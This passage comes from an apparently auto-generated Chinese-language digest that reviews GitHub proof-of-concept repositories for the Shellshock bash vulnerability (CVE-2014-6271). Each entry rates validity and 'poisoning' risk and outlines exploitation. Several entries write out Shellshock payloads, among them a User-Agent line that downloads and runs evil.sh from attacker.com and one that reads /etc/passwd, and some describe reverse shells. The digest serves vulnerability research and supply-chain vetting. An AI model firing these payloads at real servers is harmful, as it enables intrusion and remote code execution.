该漏洞利用的有效性取决于目标系统是否易受攻击，以及攻击者是否能够找到合适的攻击入口点。由于脚本需要用户输入目标IP和执行的命令/反向shell信息，因此投毒风险主要在于：

*   **误用风险：** 用户可能在未经授权的系统上使用该脚本，导致法律问题。
*   **脚本篡改：**  攻击者可能篡改脚本，添加恶意功能（例如植入后门、窃取用户凭据等），然后诱骗其他用户使用。

因此，我评估此仓库中存在作者隐藏的投毒代码的风险为10%。这主要是基于脚本本身的性质（漏洞利用工具）以及潜在的被篡改和滥用的可能性。

**项目地址:** [YunchoHang/CVE-2014-6271-SHELLSHOCK](https://github.com/YunchoHang/CVE-2014-6271-SHELLSHOCK)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #14

**来源**: [CVE-2014-6271-ajansha_shellshock.md](../2014/CVE-2014-6271-ajansha_shellshock.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 命令注入

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 通过 4.3

**利用条件:** 需要目标系统存在Bash环境并且存在可以设置环境变量的利用入口，例如：OpenSSH的ForceCommand、Apache HTTP Server的mod_cgi/mod_cgid等

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，也被称为Shellshock，是一个存在于GNU Bash中的命令注入漏洞。攻击者可以通过在环境变量中嵌入恶意代码，当Bash解析这些变量时，恶意代码会被执行，从而实现远程代码执行。

**有效性：**
根据漏洞库信息和搜索结果，CVE-2014-6271是一个真实存在且影响广泛的漏洞。提供的shelly.sh脚本是一个漏洞扫描器，用于检测目标系统是否存在Shellshock漏洞。由于它旨在 *检测* 而非 *利用* 漏洞，因此可以判断poc有效。

**投毒风险：**
分析提供的shelly.sh脚本，主要功能是检测目标系统是否存在Shellshock漏洞。脚本本身包含恶意代码的可能性较低，其主要通过发送包含特定payload的环境变量来触发漏洞，因此投毒的风险主要来自于脚本作者是否在检测Payload之外添加了额外的恶意逻辑。

尽管代码看起来比较直接，但仍然存在一定的低概率投毒风险，例如：
*   在漏洞检测逻辑之外，添加额外的命令执行代码，例如，扫描到存在漏洞后执行特定操作，上传信息等。
*   通过精心构造的payload，在检测漏洞的同时，悄悄地在目标系统上留下后门。

综合考虑代码量和功能，评估投毒风险为10%。

**利用方式：**
1.  **确定目标：** 找到运行存在漏洞的Bash版本的系统。
2.  **寻找入口点：** 确定可以通过设置环境变量来与目标系统交互的入口点。常见的入口点包括：
    *   **HTTP CGI脚本：** 通过修改HTTP请求头中的User-Agent等字段，设置环境变量。
    *   **OpenSSH ForceCommand：**  通过SSH连接时设置环境变量。
    *   **DHCP客户端：** 某些DHCP客户端脚本在执行时会受到环境变量的影响。
3.  **构造Payload：** 构造包含恶意代码的环境变量。Payload的基本形式为`(){ :; }; command`，其中`command`是要执行的命令。
4.  **发送Payload：** 通过选择的入口点将构造的Payload发送给目标系统。
5.  **执行恶意代码：**  当目标系统中的Bash解析包含恶意代码的环境变量时，恶意代码将被执行，攻击者从而控制目标系统。

**项目地址:** [ajansha/shellshock](https://github.com/ajansha/shellshock)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #15

**来源**: [CVE-2014-6271-akr3ch_CVE-2014-6271.md](../2014/CVE-2014-6271-akr3ch_CVE-2014-6271.md)

## CVE-2014-6271 ShellShock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，允许远程攻击者通过构造的恶意环境变量执行任意代码。

**影响版本:** <= 4.3

**利用条件:** 目标系统使用存在漏洞的 Bash 版本，且存在允许设置环境变量的途径，如 SSH ForceCommand, Apache mod_cgi/mod_cgid, DHCP 客户端等。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2014-6271 (Shellshock) 漏洞存在于 GNU Bash 中，攻击者可以通过在环境变量中嵌入恶意代码，利用 Bash 处理函数定义时存在的缺陷来执行任意命令。提供的 exploit.py 代码通过构造包含恶意命令的 User-Agent 头部，向目标 URL 发送 HTTP 请求，尝试利用 mod_cgi 或其他 CGI 脚本来触发漏洞。该漏洞影响广泛，可能导致服务器被完全控制。

**有效性：**
提供的 Python 脚本是有效的漏洞利用PoC，它通过构造恶意的 User-Agent 头部来触发 Shellshock 漏洞。

**投毒风险：**
该脚本的主要功能是利用 Shellshock 漏洞，没有发现任何明显的投毒代码，0%的可能性存在作者隐藏的投毒代码。

**利用方式：**
1.  确定目标系统运行着存在漏洞的 Bash 版本。
2.  找到一个可以设置环境变量的入口点（如 CGI 脚本）。
3.  使用提供的 Python 脚本或其他类似工具构造包含恶意代码的 HTTP 请求，并将该请求发送到目标 URL。
4.  如果漏洞存在且利用成功，恶意代码将在目标系统上执行。

**项目地址:** [akr3ch/CVE-2014-6271](https://github.com/akr3ch/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #16

**来源**: [CVE-2014-6271-anujbhan_shellshock-victim-host.md](../2014/CVE-2014-6271-anujbhan_shellshock-victim-host.md)

## CVE-2014-6271-Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** <= 4.3

**利用条件:** 目标系统使用存在漏洞的Bash版本，并且通过CGI或其他方式允许环境变量注入。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，又名Shellshock，是一个存在于 GNU Bash 中的严重漏洞。该漏洞允许攻击者通过特制的包含函数定义的字符串，在环境变量中注入并执行任意代码。

**有效性：**
提供的 Dockerfile 和相关 CGI 脚本构成了一个有效的 PoC 环境。Dockerfile 设置了一个基于 `vulhub/bash:4.3.0-with-httpd` 镜像的容器，该镜像包含一个易受攻击的 Bash 版本和一个 HTTP 服务器。`victim.cgi` 脚本旨在通过 CGI 执行 Bash 代码，但脚本本身的代码是无害的。漏洞利用的关键在于攻击者如何构造 HTTP 请求，将恶意代码注入到传递给 `victim.cgi` 脚本的环境变量中。如果服务器配置允许，则可以远程利用此漏洞执行任意命令。

**投毒风险：**
在提供的代码片段中，直接的代码投毒风险较低（约为 10%），主要原因是:
* `safe.cgi` 和 `victim.cgi` 文件中的 bash 代码非常简单，只输出“Hello world”，功能正常。没有发现任何恶意代码。  
*  Dockerfile指令中的 `RUN chmod +x /var/www/html/safe.cgi` 和 `RUN chmod +x /var/www/html/victim.cgi` 功能正常，没有发现任何恶意代码。

但是，需要注意以下几点潜在风险：
* **基础镜像风险：** PoC 依赖于 `vulhub/bash:4.3.0-with-httpd` 镜像。虽然该镜像旨在提供一个易受攻击的环境，但仍然需要确保该镜像本身没有被篡改或包含恶意代码。评估基础镜像的来源和可信度至关重要。
* **服务器配置风险：** 漏洞的利用依赖于 Web 服务器（如 Apache）如何处理 CGI 请求以及环境变量。如果服务器配置不当，可能会进一步加剧漏洞的风险。例如，某些配置可能允许攻击者覆盖更多的环境变量，从而扩大攻击面。
* **供应链攻击风险：** 攻击者可能通过污染开发者的环境或者代码仓库来插入恶意代码。

总体来说，直接代码投毒的风险较低，但基础镜像和服务器配置的安全性仍然需要谨慎评估。

**利用方式：**
1.  **目标环境：** 目标系统需要运行一个存在漏洞的 Bash 版本（<= 4.3）。
2.  **攻击入口：** 攻击通常通过 CGI 脚本或其他接受环境变量的 Web 应用入口进行。
3.  **注入恶意代码：** 攻击者构造一个包含恶意代码的环境变量。典型的 Shellshock payload 如下：`() { :; }; echo vulnerable`。这个 payload 利用了 Bash 在处理函数定义后剩余字符串的方式，`echo vulnerable` 会被执行。
4.  **触发漏洞：** 当 Bash 执行 CGI 脚本或处理包含恶意环境变量的请求时，漏洞被触发，攻击者注入的代码被执行。
5.  **远程代码执行：** 一旦漏洞被触发，攻击者就可以在目标系统上执行任意命令，例如获取敏感信息、修改系统配置或安装恶意软件。

**举例说明：**
攻击者可以构造一个 HTTP 请求头，例如 `User-Agent: () { :; }; /usr/bin/wget http://attacker.com/evil.sh -O /tmp/evil.sh; sh /tmp/evil.sh`。当 Web 服务器调用 Bash 处理该请求时，`wget` 命令会被执行，从 `attacker.com` 下载恶意脚本并在目标系统上执行。

**项目地址:** [anujbhan/shellshock-victim-host](https://github.com/anujbhan/shellshock-victim-host)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #17

**来源**: [CVE-2014-6271-b4keSn4ke_CVE-2014-6271.md](../2014/CVE-2014-6271-b4keSn4ke_CVE-2014-6271.md)

## CVE-2014-6271 - Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 4.3

**利用条件:** 目标系统使用存在漏洞的Bash版本，且允许通过环境变量影响Bash执行，例如CGI脚本。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271（Shellshock）漏洞允许攻击者通过构造包含恶意代码的环境变量来执行任意命令。当Bash执行程序（例如，通过CGI脚本在Web服务器上）时，它会解析这些环境变量，从而导致代码注入。 

**有效性：**

根据提供的漏洞库信息、搜索结果和漏洞利用代码，该漏洞利用是有效的。漏洞库中明确指出该漏洞允许远程攻击者执行任意代码，搜索结果中也包含大量关于该漏洞的描述、利用案例和补丁信息。提供的Python POC代码也表明该漏洞可以被利用于获取目标系统的反向shell。

**投毒风险：**

分析提供的Python POC代码，风险较低。代码主要功能是构建带有恶意环境变量的HTTP请求，并发送到目标CGI脚本。代码中存在可以植入恶意代码的风险点在于payload的构建部分，但是目前的代码相对简单，仅用于执行反向shell。该仓库的 README 中有明确的测试目标和使用说明，相对比较安全。综上，认为此仓库存在10%的作者隐藏的投毒代码的可能性，该投毒代码可能为隐蔽的下载和执行其他恶意脚本。

**利用方式：**

1.  **确定目标：** 找到运行Bash且容易受到环境变量影响的应用程序或服务。常见的例子包括Web服务器上的CGI脚本。
2.  **构建Payload：** 构造一个包含恶意代码的环境变量。Payload通常包含一个函数定义，后跟要执行的命令。例如：`(){ :; }; echo vulnerable`
3.  **发送Payload：** 将构造的环境变量作为HTTP请求头或其他方式发送到目标应用程序。对于CGI脚本，可以通过User-Agent或其他HTTP头来传递。
4.  **执行代码：** 当目标应用程序调用Bash执行某些操作时，Bash会解析环境变量，从而执行注入的恶意代码。
5.  **反向Shell:** 本次提供的POC中,攻击者设置监听端口,通过漏洞利用,目标主机反弹shell给攻击者,达到控制目标主机的目的.

**风险缓解：**

*   升级Bash到已修复的版本。
*   限制对CGI脚本和其他易受攻击应用程序的访问。
*   验证和清理所有输入，特别是来自环境变量的输入。
*   使用入侵检测系统（IDS）和入侵防御系统（IPS）来检测和阻止Shellshock攻击。

**项目地址:** [b4keSn4ke/CVE-2014-6271](https://github.com/b4keSn4ke/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #18

**来源**: [CVE-2014-6271-cved-sources_cve-2014-6271.md](../2014/CVE-2014-6271-cved-sources_cve-2014-6271.md)

## CVE-2014-6271-ShellShock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** <= 4.3

**利用条件:** 目标系统存在CGI脚本或使用OpenSSH的ForceCommand功能等

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，又称ShellShock，是一个存在于GNU Bash中的远程代码执行漏洞。漏洞源于Bash在处理环境变量中函数定义后的trailing strings的方式存在缺陷，允许攻击者通过构造恶意的环境变量来执行任意代码。

**1. 有效性：**

提供的Dockerfile构建了一个存在ShellShock漏洞的环境。`test.cgi`脚本被放置在`/usr/local/apache2/cgi-bin/`目录下，并且赋予了执行权限。该脚本会输出`/usr/bin/env`的内容，攻击者可以通过构造包含恶意代码的环境变量，并发送HTTP请求访问该CGI脚本，从而触发漏洞并执行恶意代码。因此提供的POC代码是有效的。

**2. 投毒风险：**

分析Dockerfile和相关文件：

*   Dockerfile：用于构建Docker镜像，升级Bash到4.3，并应用patch。
*   README.md：包含关于漏洞的信息以及镜像的来源。
*   `build/test.cgi`：一个简单的CGI脚本，用于触发漏洞。这个脚本本身不包含任何恶意代码,只是用于展示环境变量。

虽然大部分代码用于搭建漏洞测试环境，但仍存在潜在的投毒风险。Dockerfile中使用了`wget`从外部源下载bash源码和patch。尽管URL看起来是官方的GNU源，但如果这些源被劫持，则可能被替换为包含恶意代码的版本。此外，即使源代码没有被篡改，应用patch的过程也可能引入意料之外的问题。

综合来看，投毒风险较低，大约为10%。主要风险在于对外部源的依赖，以及patch应用过程中的潜在问题。

**3. 利用方式：**

ShellShock漏洞的利用方式如下：

1.  **攻击者构造包含恶意代码的环境变量。** 恶意代码被嵌入到函数定义之后，例如：`(){ :; }; command`。
2.  **攻击者通过某种方式将该环境变量传递给Bash。** 常见的场景包括：
    *   **CGI脚本：** 攻击者可以通过HTTP请求头设置环境变量，当Web服务器调用CGI脚本时，会将这些环境变量传递给Bash解释器。
    *   **OpenSSH的ForceCommand功能：** 攻击者可以通过SSH连接，利用ForceCommand功能执行命令，并将恶意环境变量传递给Bash。
    *   **DHCP客户端：** 在某些情况下，DHCP客户端会执行脚本，并将DHCP服务器提供的环境变量传递给Bash。
3.  **Bash执行包含恶意代码的环境变量。** 当Bash遇到函数定义后的trailing strings时，会将其作为命令执行，从而导致远程代码执行。

例如，通过CGI脚本利用该漏洞的Payload可能如下所示：

```
GET /cgi-bin/test.cgi HTTP/1.1
User-Agent: () { :; }; /usr/bin/env
Host: target.com
```

该请求会将`User-Agent`头设置为包含恶意代码的环境变量，当Web服务器调用`test.cgi`脚本时，`/usr/bin/env`命令会被执行。

**项目地址:** [cved-sources/cve-2014-6271](https://github.com/cved-sources/cve-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #19

**来源**: [CVE-2014-6271-cyberharsh_Shellbash-CVE-2014-6271.md](../2014/CVE-2014-6271-cyberharsh_Shellbash-CVE-2014-6271.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** through 4.3

**利用条件:** 目标系统使用CGI，OpenSSH等方式，且Bash版本在受影响范围内

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2014-6271，又名Shellshock，是一个存在于GNU Bash中的高危漏洞。该漏洞允许攻击者通过特制的、包含恶意代码的环境变量，在目标系统上执行任意命令。漏洞利用的方式是：通过将包含函数定义的恶意字符串作为环境变量的值传递给Bash，Bash在解析这些环境变量时，会错误地执行函数定义后面的命令。漏洞利用代码分析：提供的Dockerfile构建了一个包含易受攻击的Bash版本（4.3.0）和Apache HTTP Server的Docker镜像。`safe.cgi`和`victim.cgi`脚本被添加到`/var/www/html/`目录下。`victim.cgi`使用易受攻击的Bash版本，而`safe.cgi` 使用修复后的版本（但提供的代码中，两个cgi都一样，都是直接输出helloworld）。攻击者可以通过修改User-Agent头，或者通过其他CGI变量传递恶意代码，从而在服务器上执行命令。根据readme.md的描述，向victim.cgi发送包含payload的User-Agent，可以触发漏洞。例如：

`User-Agent: () { foo; }; echo Content-Type: text/plain; echo; /usr/bin/id`

该漏洞利用的有效性较高，因为漏洞原理简单，且影响范围广泛。**投毒风险评估：**代码仓库中可能存在作者隐藏的恶意代码的风险较低，这里评估为1%。主要原因是：Dockerfile比较简单，只是构建了一个包含特定版本Bash和Apache HTTP Server的镜像，没有发现明显的后门代码。safe.cgi和victim.cgi 脚本本身也比较简单，只是输出“Hello world”，并没有包含任何可疑的逻辑。flagA文件只是一个标记文件，不包含任何可执行代码。虽然不能完全排除作者在镜像构建过程中隐藏恶意代码的可能性，但从目前的代码来看，这种可能性很小。

**利用方式总结：**

1.  **确定目标系统使用的Bash版本在受影响范围内（<=4.3）。**
2.  **找到一个可以设置环境变量的入口点，例如CGI脚本、OpenSSH的ForceCommand等。**
3.  **构造包含恶意代码的环境变量，例如：`() { :; }; /usr/bin/id`。**
4.  **将该环境变量传递给Bash。**
5.  **Bash解析环境变量时，会执行恶意代码。**

利用代码中的`victim.cgi`脚本是一个CGI入口点，攻击者可以通过修改HTTP请求头（例如User-Agent）来设置环境变量，从而触发漏洞。

**项目地址:** [cyberharsh/Shellbash-CVE-2014-6271](https://github.com/cyberharsh/Shellbash-CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #20

**来源**: [CVE-2014-6271-hadrian3689_shellshock.md](../2014/CVE-2014-6271-hadrian3689_shellshock.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行，系统完全控制

**影响版本:** Bash <= 4.3

**利用条件:** 目标系统存在CGI脚本或通过OpenSSH等方式设置环境变量

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，也被称为Shellshock，是一个存在于GNU Bash中的远程代码执行漏洞。该漏洞允许攻击者通过构造包含恶意代码的环境变量来执行任意命令。

**有效性：**
提供的POC代码是有效的。该Python脚本利用Shellshock漏洞通过User-Agent头注入恶意Bash代码，从而在目标系统上执行命令，可以实现反向shell或伪交互式shell。

**投毒风险：**
该脚本主要功能是利用Shellshock漏洞，但代码中存在一定的投毒风险：
*   **风险点：** `shellshock.py`中的payload构造部分，即`payload = "() { :;}; echo; /bin/bash -c 'echo " + cmd + " | base64 -d | sh'"`。虽然脚本本身的目标是实现反向shell，但是攻击者可以修改`cmd`变量的内容，插入恶意的、非反向shell的代码，进行破坏或植入后门。
*   **缓解措施：** 使用者应仔细审查脚本内容，尤其是`cmd`变量的赋值部分，确保脚本执行的是预期操作，并且来自可信来源。
*   **投毒风险百分比:** 10%。主要是脚本中自定义命令的灵活性可能被滥用，并非恶意代码。大部分代码功能清晰，实现的是漏洞利用逻辑。

**利用方式：**
1.  **漏洞原理：** Bash在解析环境变量时，如果环境变量的值包含函数定义，Bash会执行函数定义后面的字符串。攻击者可以利用这个特性，在环境变量中注入恶意代码。
2.  **攻击方法：**
    *   **通过HTTP User-Agent头：** POC脚本通过修改HTTP请求的User-Agent头，将包含恶意代码的环境变量传递给服务器。如果服务器使用Bash处理User-Agent头（例如，通过CGI脚本），那么恶意代码就会被执行。
    *   **反向Shell：** 脚本通过构造Bash命令，建立与攻击者机器的反向TCP连接，从而获得目标系统的shell访问权限。
    *   **正向Shell (防火墙绕过)：** 脚本创建一个命名管道(FIFO)用于输入和输出，攻击者通过HTTP请求向管道写入命令，并读取管道的输出来实现交互式shell。这种方式可以绕过一些防火墙的限制。
3.  **利用条件：**
    *   目标系统运行着存在Shellshock漏洞的Bash版本。
    *   存在可以传递环境变量给Bash的途径，例如CGI脚本、OpenSSH的ForceCommand等。
    *   如果使用反向shell，目标系统需要能够连接到攻击者的机器。

**项目地址:** [hadrian3689/shellshock](https://github.com/hadrian3689/shellshock)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #21

**来源**: [CVE-2014-6271-hanmin0512_CVE-2014-6271_pwnable.md](../2014/CVE-2014-6271-hanmin0512_CVE-2014-6271_pwnable.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 命令注入

**影响应用:** Bash

**危害等级:** 高危，可导致远程代码执行

**影响版本:** <= 4.3

**利用条件:** 需要目标系统存在CGI脚本、OpenSSH等利用入口，允许设置环境变量

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2014-6271，又名Shellshock，是一个存在于GNU Bash中的命令注入漏洞。攻击者可以构造包含恶意代码的环境变量，当Bash shell执行时，会将恶意代码一并执行，从而达到远程命令执行的目的。

**有效性：**

提供的POC代码是有效的，它演示了利用Shellshock漏洞的基本原理，即通过设置包含恶意代码的环境变量来执行任意命令。shellshock.c 文件通过提权后执行 bash 命令来证明改漏洞的利用。

**投毒风险：**

代码仓库中未发现明显的投毒代码。shellshock.c 只是简单的提权后执行了 bash 命令。

**利用方式：**

1.  **漏洞原理：** Bash在处理环境变量时，如果环境变量的值以函数定义开头，Bash会尝试解析并执行该函数定义之后的代码。如果攻击者能够控制环境变量的内容，就可以注入恶意的代码。

2.  **利用场景：**

    *   **CGI脚本：**  Web服务器在执行CGI脚本时，会将HTTP请求头中的某些字段作为环境变量传递给脚本。攻击者可以修改这些HTTP请求头，注入恶意代码。
    *   **OpenSSH：**  如果OpenSSH启用了`ForceCommand`功能，并且`ForceCommand`中使用了Bash shell，攻击者可以通过设置环境变量来执行命令。
    *   **DHCP客户端：**  某些DHCP客户端脚本会执行Bash shell，攻击者可以通过控制DHCP服务器，设置包含恶意代码的环境变量。

3.  **利用步骤：**

    a.  确定目标系统存在Bash shell，且版本小于等于4.3。
    b.  找到一个可以通过环境变量影响Bash执行的入口（例如CGI脚本）。
    c.  构造包含恶意代码的环境变量，例如：
        `export payload='() { ignored; }; /bin/cat /etc/passwd'`
    d.  将该环境变量传递给Bash shell执行。
    e.  如果漏洞存在，`/etc/passwd`文件的内容将被输出。

**项目地址:** [hanmin0512/CVE-2014-6271_pwnable](https://github.com/hanmin0512/CVE-2014-6271_pwnable)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #22

**来源**: [CVE-2014-6271-indiandragon_Shellshock-Vulnerability-Scan.md](../2014/CVE-2014-6271-indiandragon_Shellshock-Vulnerability-Scan.md)

## CVE-2014-6271 ShellShock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，允许远程攻击者执行任意代码

**影响版本:** <= 4.3

**利用条件:** 目标系统使用Bash，且攻击者能够通过环境变量影响Bash执行

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2014-6271（ShellShock）是一个存在于GNU Bash中的高危漏洞。该漏洞允许攻击者通过构造特制的包含恶意代码的环境变量，在目标系统上执行任意命令。漏洞利用方式主要依赖于Bash处理函数定义后尾随字符串的方式。攻击者可以将恶意代码嵌入到环境变量中，当Bash解析这些变量时，尾随的恶意代码会被执行。

**有效性评估：**
漏洞库信息和搜索结果均表明该漏洞真实存在且危害严重，存在大量可利用的场景。利用代码库中提供的文件看起来是GNU GPL许可证，本身不包含攻击代码，但实际漏洞利用需要构造特定的环境变量。

**投毒风险评估：**
提供的漏洞利用代码片段（LICENSE文件）本身不具备投毒性，它只是一个开源协议文件。投毒风险主要存在于漏洞利用的上下文和攻击者构造的恶意环境变量中。如果攻击者散布包含恶意代码的环境变量构造方法，可能会诱导用户执行有害操作。但仅分析提供的LICENSE文件，投毒风险极低，约为1%。

**利用方式分析：**
1.  **环境变量注入：** 攻击者构造包含恶意代码的环境变量，例如：`(){ :; }; /bin/eject`。
2.  **触发Bash解析：** 寻找能够触发Bash解析这些环境变量的入口点。常见的入口点包括：
    *   OpenSSH的`ForceCommand`。
    *   Apache HTTP Server的`mod_cgi`和`mod_cgid`模块。
    *   DHCP客户端脚本。
    *   其他任何跨越权限边界并设置环境变量的Bash执行场景。
3.  **远程代码执行：** 当Bash解析包含恶意代码的环境变量时，嵌入的命令会被执行，导致远程代码执行。

根据搜索结果，该漏洞已存在多年，但由于其影响范围广泛，仍然值得关注。应及时更新Bash版本，并检查系统配置，避免受到攻击。

**项目地址:** [indiandragon/Shellshock-Vulnerability-Scan](https://github.com/indiandragon/Shellshock-Vulnerability-Scan)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #23

**来源**: [CVE-2014-6271-knightc0de_Shellshock_vuln_Exploit.md](../2014/CVE-2014-6271-knightc0de_Shellshock_vuln_Exploit.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行，系统权限获取

**影响版本:** <= 4.3

**利用条件:** 目标系统使用Bash作为shell，且存在CGI脚本或允许通过环境变量传递命令

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，又名Shellshock，是一个存在于GNU Bash中的高危漏洞。该漏洞允许攻击者通过构造特制的包含恶意代码的环境变量，在目标系统上执行任意命令。当Bash shell处理这些环境变量时，会在函数定义后执行嵌入的命令，从而导致安全风险。

**有效性：**

提供的PoC代码是有效的，它通过`pwn`库和`requests`库实现漏洞利用。该脚本通过构造包含恶意Bash代码的HTTP请求头（User-Agent, Cookie, Referer）发送到目标服务器，如果目标服务器存在CGI脚本且使用存在漏洞的Bash版本，则会执行恶意代码，并反弹shell到攻击者指定的IP地址和端口。

**投毒风险：**

该仓库中存在一定的投毒风险，风险评估为10%。虽然作者提供了免责声明，并且主要代码逻辑是为了利用Shellshock漏洞，但仍然存在潜在的后门或恶意修改的可能性，尽管看起来相对较低：
*   **依赖风险**: 依赖`pwn`和`requests`库，如果这些库被篡改，可能引入恶意代码。
*   **Payload定制**: Payload的构造方式可能被修改，引入额外的恶意行为。

**利用方式：**

1.  **确定目标：** 寻找运行CGI脚本的web服务器，或者其他任何可能通过环境变量传递命令给Bash的应用程序。
2.  **构造Payload：** 构造一个包含恶意Bash代码的环境变量，例如：`() { :;}; /bin/bash -c 'command'`。
3.  **传递Payload：** 通过HTTP请求头（User-Agent, Cookie, Referer）或者其他方式将payload作为环境变量传递给目标系统。
4.  **触发漏洞：** 当Bash shell处理包含恶意代码的环境变量时，会执行嵌入的命令。
5.  **获取权限：** 利用反弹shell或其他方式获取目标系统的控制权。

**项目地址:** [knightc0de/Shellshock_vuln_Exploit](https://github.com/knightc0de/Shellshock_vuln_Exploit)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #24

**来源**: [CVE-2014-6271-mochizuki875_CVE-2014-6271-Apache-Debian.md](../2014/CVE-2014-6271-mochizuki875_CVE-2014-6271-Apache-Debian.md)

## CVE-2014-6271-Apache-Debian Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，允许远程攻击者执行任意代码

**影响版本:** <= 4.3

**利用条件:** 需要目标系统存在CGI脚本，且Apache配置允许执行CGI脚本，并且Bash版本存在漏洞。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2014-6271（Shellshock）是一个影响 GNU Bash 的高危漏洞。该漏洞源于 Bash 处理环境变量中函数定义后附加字符串的方式存在缺陷，允许远程攻击者通过构造特殊的环境变量来执行任意代码。

**有效性：**

根据提供的 PoC 代码（/tmp/47c4ac3d27239b789878e6360b54dc21/README.md），该 PoC 旨在演示如何在 Apache Debian 环境中利用 CVE-2014-6271 漏洞。它包含构建易受攻击的 Docker 镜像和 Kubernetes 清单的步骤，以及利用漏洞的演示。

PoC 代码的有效性通过以下事实得到证实：

*   它提供了一个明确的攻击向量：通过 `User-Agent` HTTP 头传递恶意构造的 Bash 函数定义。
*   它演示了如何获得受害容器上的 shell 访问权限。
*   它演示了如何在受害容器上修改 Web 页面内容。

因此，提供的 PoC 代码可以被认为是有效的。

**投毒风险：**

评估 PoC 代码的投毒风险表明，主要风险较低，约为 5%。

*   **高风险文件:** 位于`/tmp/47c4ac3d27239b789878e6360b54dc21/web-insecure/Dockerfile`，这个Dockerfile 用于构建包含漏洞环境，该漏洞是已知的，构建目的是用于演示验证，所以它不是投毒代码。
*   **低风险文件:** 其他文件（例如 web-secure 目录中的文件和 k8s 清单文件）似乎是良性的，并且用于设置安全的环境以进行比较或者演示。
*   **总体分析:**

虽然该存储库的目的是演示漏洞，但攻击者可能会修改 `web-insecure/Dockerfile` 以包含其他恶意软件或后门。用户在使用这些文件构建镜像时应谨慎。

**利用方式：**

利用 CVE-2014-6271 漏洞涉及以下步骤：

1.  **确定目标：**识别运行易受攻击的 Bash 版本的系统，该系统通常用于处理 Web 请求或 CGI 脚本。
2.  **构造攻击负载：**创建一个包含恶意 Bash 函数定义的特殊构造的环境变量。
3.  **传递攻击负载：**通过 HTTP 请求头（例如 `User-Agent`）或 CGI 脚本可以访问的任何其他环境变量将攻击负载传递到目标系统。
4.  **执行任意代码：**当 Bash 处理恶意环境变量时，它会执行其中嵌入的命令。

在提供的 PoC 代码中，利用方式如下：

1.  攻击者设置一个 netcat 监听器 (`nc -nvlp 5050`)。
2.  攻击者使用 curl 命令向易受攻击的 Web 服务发送一个 HTTP 请求，其中 `User-Agent` 头包含一个恶意的 Bash 函数定义。这个函数定义包含执行反向 shell 的命令，将 shell 连接到攻击者的 netcat 监听器。
3.  当 Web 服务（通常通过 CGI 脚本）执行 Bash 时，Bash 会处理恶意的 `User-Agent` 头，执行反向 shell 命令，并允许攻击者访问受害容器上的 shell。

**项目地址:** [mochizuki875/CVE-2014-6271-Apache-Debian](https://github.com/mochizuki875/CVE-2014-6271-Apache-Debian)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #25

**来源**: [CVE-2014-6271-moften_CVE-2014-6271.md](../2014/CVE-2014-6271-moften_CVE-2014-6271.md)

## CVE-2014-6271 Shellshock漏洞扫描器

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，允许攻击者执行任意命令

